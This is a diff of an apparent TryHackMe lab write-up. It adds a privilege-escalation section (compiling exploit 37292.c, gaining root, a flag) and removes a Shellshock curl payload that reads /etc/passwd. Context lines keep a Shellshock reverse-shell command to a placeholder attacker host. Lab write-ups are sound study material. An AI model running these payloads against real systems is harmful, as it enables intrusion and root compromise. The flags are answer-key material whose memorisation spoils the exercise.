@@ -34,15 +34,35 @@ curl –H ‘User-Agent: () { :;}; echo; echo; /bin/bash –i >& /dev/tcp/<attac
 
 THM{Sh3llSh0ck_r0ckz}
 
+Privilege Escalation
+
+![image](https://github.com/user-attachments/assets/b61c9c8e-9179-40fe-9b13-6783de7bd675)
+
+![image](https://github.com/user-attachments/assets/33026a40-2a21-4c3e-913d-844fc57aa828)
+
+![image](https://github.com/user-attachments/assets/99d7b487-dd66-4cad-980c-c91f0194b686)
+
+![image](https://github.com/user-attachments/assets/1518b546-ea02-4ac6-a457-8064d1d6b11f)
+
+export PATH=/usr/local/bin:/usr/local/sbin:/usr/bin:/usr/sbin:/bin:/sbin
+
+gcc 37292.c -o 3
+
+![image](https://github.com/user-attachments/assets/29a2299d-ca42-40f4-b470-e230883698dc)
+
+we got root access
+
+![image](https://github.com/user-attachments/assets/f416d31a-20c9-4e59-a433-b26d1b4f9520)
+
+THM{g00d_j0b_0day_is_Pleased}
 
 
 
-Let’s do some research on the Shellshock vulnerability we identified earlier. After a quick Google search, we’ve come across an exploit for it on GitHub.
 
-curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" \
-http://localhost:8080/cgi-bin/vulnerable
 
-![image](https://github.com/user-attachments/assets/43a6d242-ae4b-4849-9c55-c615d74d623f)
+
+
+
 
 
 
